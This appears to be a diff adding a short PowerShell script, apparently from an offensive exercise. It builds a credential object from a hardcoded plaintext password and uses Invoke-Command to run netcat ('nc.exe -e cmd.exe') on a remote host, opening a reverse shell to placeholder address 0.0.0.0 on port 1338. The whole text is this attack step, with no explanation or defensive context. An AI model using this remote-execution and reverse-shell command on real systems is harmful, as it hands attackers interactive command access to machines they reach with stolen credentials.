@@ -1,0 +1,5 @@
+$pass = ConvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential ('hostname\username', $pass)
+Invoke-Command -ComputerName hostname -Credential $cred -ScriptBlock { C:\tmp\nc.exe -e cmd.exe 0.0.0.0 1338 }
+
+
